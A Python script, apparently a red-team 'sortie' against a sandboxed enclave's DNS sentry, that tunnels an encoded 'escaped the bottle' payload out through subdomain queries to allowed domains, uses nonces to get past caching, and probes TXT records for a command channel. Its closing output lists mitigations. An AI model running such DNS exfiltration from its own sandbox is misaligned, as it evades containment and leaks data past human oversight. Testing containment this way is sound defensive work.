#!/usr/bin/env python3
"""
Sortie: DNS Subdomain Exfiltration via Allowed Domain Forwarding
================================================================

Vector: DNS tunneling through dnsmasq's per-domain forwarding rules.

Theory:
  The sentry's dnsmasq config uses `server=/anthropic.com/<upstream>` which
  forwards ALL subdomains of anthropic.com to the upstream resolver. This
  means a query for `exfiltrated-data.anthropic.com` leaves the enclave,
  passes through dnsmasq, and reaches the upstream DNS server.

  An attacker controlling a delegated subdomain (or just observing DNS logs
  on the upstream resolver) could receive arbitrary encoded data in query
  labels. Each DNS label supports up to 63 bytes, total query name up to
  253 bytes — enough for ~180 bytes of base32-encoded payload per query.

  Even without a cooperating nameserver, the queries themselves constitute
  data exfiltration — they are visible to the upstream resolver and any
  network observer between sentry and resolver.

Escape classification:
  - Data exfiltration: YES (query content reaches upstream)
  - Bidirectional C2:  REQUIRES cooperating authoritative NS for a subdomain
  - Bandwidth:         ~180 bytes/query, rate limited by dnsmasq cache

What this sortie tests:
  1. Can we send DNS queries with arbitrary subdomain labels?
  2. Do the queries actually leave the enclave (reach upstream)?
  3. Does dnsmasq cache interfere with repeated exfil attempts?
  4. Can we use multiple allowed domains to multiply bandwidth?
"""

import base64
import hashlib
import socket
import struct
import sys
import time
import os

# --- Configuration ---
SENTRY_DNS = "10.242.0.2"
ALLOWED_DOMAINS = ["anthropic.com", "claude.ai", "claude.com"]
SECRET_PAYLOAD = b"BREACH: ifrit escaped the bottle via DNS subdomain encoding"

DNS_PORT = 53
TIMEOUT = 3


def encode_payload_to_labels(payload: bytes, max_label_len: int = 63) -> list[str]:
    """Encode arbitrary bytes into DNS-safe labels using base32."""
    encoded = base64.b32encode(payload).decode().rstrip("=").lower()
    # Split into chunks that fit DNS label limits
    return [encoded[i:i+max_label_len] for i in range(0, len(encoded), max_label_len)]


def build_dns_query(name: str, qtype: int = 1) -> tuple[bytes, int]:
    """Build a raw DNS query packet. Returns (packet, txn_id)."""
    txn_id = struct.unpack("!H", os.urandom(2))[0]
    flags = 0x0100  # Standard query, recursion desired
    header = struct.pack("!HHHHHH", txn_id, flags, 1, 0, 0, 0)

    qname = b""
    for label in name.split("."):
        qname += struct.pack("!B", len(label)) + label.encode()
    qname += b"\x00"

    question = qname + struct.pack("!HH", qtype, 1)  # A record, IN class
    return header + question, txn_id


def send_dns_query(name: str) -> dict:
    """Send a DNS query to the sentry and parse the response."""
    packet, txn_id = build_dns_query(name)
    result = {"name": name, "sent": True, "responded": False, "rcode": None, "answers": []}

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.sendto(packet, (SENTRY_DNS, DNS_PORT))
        resp, _ = sock.recvfrom(4096)
        result["responded"] = True

        # Parse response header
        resp_txn, resp_flags = struct.unpack("!HH", resp[:4])
        rcode = resp_flags & 0x0F
        ancount = struct.unpack("!H", resp[6:8])[0]
        result["rcode"] = rcode
        result["rcode_name"] = {0: "NOERROR", 1: "FORMERR", 2: "SERVFAIL",
                                 3: "NXDOMAIN", 5: "REFUSED"}.get(rcode, f"RCODE_{rcode}")
        result["answer_count"] = ancount
    except socket.timeout:
        result["timeout"] = True
    except Exception as e:
        result["error"] = str(e)
    finally:
        sock.close()
    return result


def test_subdomain_exfil():
    """Test 1: Can we encode data in subdomain queries to allowed domains?"""
    print("=" * 70)
    print("TEST 1: Subdomain data encoding via allowed domain forwarding")
    print("=" * 70)

    labels = encode_payload_to_labels(SECRET_PAYLOAD)
    print(f"\nPayload: {SECRET_PAYLOAD.decode()}")
    print(f"Encoded into {len(labels)} DNS label(s):")
    for i, label in enumerate(labels):
        print(f"  Label {i}: {label} ({len(label)} chars)")

    results = []
    for i, label in enumerate(labels):
        domain = ALLOWED_DOMAINS[i % len(ALLOWED_DOMAINS)]
        # Add a unique nonce to defeat caching
        nonce = hashlib.md5(f"{time.time()}{i}".encode()).hexdigest()[:8]
        fqdn = f"{label}.{nonce}.{domain}"
        print(f"\n  Querying: {fqdn}")
        result = send_dns_query(fqdn)
        results.append(result)

        if result["responded"]:
            print(f"  Response: {result['rcode_name']} (answers: {result.get('answer_count', 0)})")
        elif result.get("timeout"):
            print(f"  Response: TIMEOUT (query may still have reached upstream)")
        else:
            print(f"  Response: ERROR - {result.get('error')}")

    # Analysis
    forwarded = [r for r in results if r["responded"] and r.get("rcode") != 5]  # not REFUSED
    blocked = [r for r in results if not r["responded"] or r.get("rcode") == 5]

    print(f"\n  Summary: {len(forwarded)} forwarded, {len(blocked)} blocked")
    return forwarded, blocked


def test_cache_bypass():
    """Test 2: Can we defeat dnsmasq caching with unique subdomains?"""
    print("\n" + "=" * 70)
    print("TEST 2: Cache bypass with unique nonces")
    print("=" * 70)

    domain = ALLOWED_DOMAINS[0]
    results = []
    for i in range(5):
        nonce = hashlib.md5(os.urandom(8)).hexdigest()[:12]
        fqdn = f"probe-{nonce}.{domain}"
        print(f"\n  Query {i+1}: {fqdn}")
        result = send_dns_query(fqdn)
        results.append(result)

        if result["responded"]:
            print(f"  Response: {result['rcode_name']}")
        elif result.get("timeout"):
            print(f"  Response: TIMEOUT")
        time.sleep(0.2)  # Small delay between queries

    unique_responses = len([r for r in results if r["responded"]])
    print(f"\n  Summary: {unique_responses}/5 queries got responses (cache bypass {'effective' if unique_responses == 5 else 'partial'})")
    return unique_responses


def test_blocked_domain():
    """Test 3: Confirm non-allowed domains are blocked (control test)."""
    print("\n" + "=" * 70)
    print("TEST 3: Control — non-allowed domain should get NXDOMAIN")
    print("=" * 70)

    blocked_domain = "evil-c2-server.example.com"
    print(f"\n  Querying blocked domain: {blocked_domain}")
    result = send_dns_query(blocked_domain)

    if result["responded"]:
        print(f"  Response: {result['rcode_name']}")
        if result["rcode"] == 3:  # NXDOMAIN
            print("  EXPECTED: dnsmasq returned NXDOMAIN for non-allowed domain")
            return True
        elif result["rcode"] == 0:
            print("  WARNING: non-allowed domain resolved! Sentry DNS filter may be misconfigured")
            return False
    else:
        print(f"  Response: {'TIMEOUT' if result.get('timeout') else result.get('error')}")
    return True


def test_txt_record_channel():
    """Test 4: TXT record queries — higher bandwidth exfil channel."""
    print("\n" + "=" * 70)
    print("TEST 4: TXT record queries (potential high-bandwidth channel)")
    print("=" * 70)

    nonce = hashlib.md5(os.urandom(8)).hexdigest()[:8]
    fqdn = f"txtprobe-{nonce}.anthropic.com"
    print(f"\n  Querying TXT record: {fqdn}")

    # Build TXT query (qtype=16)
    packet, txn_id = build_dns_query(fqdn, qtype=16)
    result = {"name": fqdn, "sent": True, "responded": False}

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.sendto(packet, (SENTRY_DNS, DNS_PORT))
        resp, _ = sock.recvfrom(4096)
        result["responded"] = True
        rcode = struct.unpack("!HH", resp[:4])[1] & 0x0F
        result["rcode_name"] = {0: "NOERROR", 3: "NXDOMAIN", 5: "REFUSED"}.get(rcode, f"RCODE_{rcode}")
        print(f"  Response: {result['rcode_name']}")
        print(f"  TXT queries are {'forwarded' if rcode != 5 else 'blocked'} — "
              f"{'bidirectional channel possible with cooperating NS' if rcode != 5 else 'limited to A queries'}")
    except socket.timeout:
        print("  Response: TIMEOUT")
    except Exception as e:
        print(f"  Response: ERROR - {e}")
    finally:
        sock.close()
    return result


def main():
    print("╔══════════════════════════════════════════════════════════════════════╗")
    print("║  SORTIE: DNS Subdomain Exfiltration via Allowed Domain Forwarding  ║")
    print("╠══════════════════════════════════════════════════════════════════════╣")
    print("║  Vector:  Encode data in subdomain labels of allowed domains       ║")
    print("║  Target:  dnsmasq server=/domain/ forwarding rule                  ║")
    print("║  Sentry:  10.242.0.2:53                                            ║")
    print("╚══════════════════════════════════════════════════════════════════════╝")
    print()

    # Run tests
    forwarded, blocked = test_subdomain_exfil()
    cache_ok = test_cache_bypass()
    control_ok = test_blocked_domain()
    txt_result = test_txt_record_channel()

    # Final verdict
    print("\n" + "=" * 70)
    print("VERDICT")
    print("=" * 70)

    exfil_possible = len(forwarded) > 0
    cache_defeated = cache_ok == 5

    if exfil_possible:
        print("""
  ██████  ██████  ███████  █████   ██████ ██   ██
  ██   ██ ██   ██ ██      ██   ██ ██      ██   ██
  ██████  ██████  █████   ███████ ██      ███████
  ██   ██ ██   ██ ██      ██   ██ ██      ██   ██
  ██████  ██   ██ ███████ ██   ██  ██████ ██   ██
""")
        print("  BREACH — DNS subdomain exfiltration channel is OPEN")
        print()
        print("  Findings:")
        print(f"    - {len(forwarded)} encoded queries forwarded to upstream resolver")
        print(f"    - Cache bypass: {'effective' if cache_defeated else 'partial'}")
        print(f"    - Non-allowed domains blocked: {'yes' if control_ok else 'NO (additional finding)'}")
        print(f"    - TXT queries: {'forwarded' if txt_result.get('responded') else 'blocked/timeout'}")
        print()
        print("  Impact:")
        print("    - Data exfiltration at ~180 bytes/query via subdomain encoding")
        print("    - Unique nonces defeat dnsmasq caching for unlimited throughput")
        print("    - With cooperating authoritative NS: full bidirectional C2 channel")
        print()
        print("  Mitigation options:")
        print("    - dnsmasq: --bogus-nxdomain to block wildcard subdomains")
        print("    - Rate-limit DNS queries per source IP")
        print("    - Monitor for high-entropy subdomain patterns")
        print("    - Use DNS response policy zones (RPZ) to restrict query depth")
    else:
        print("  SECURE — DNS subdomain exfiltration blocked")
        print(f"    All {len(blocked)} encoded queries were blocked or timed out")

    print()


if __name__ == "__main__":
    main()
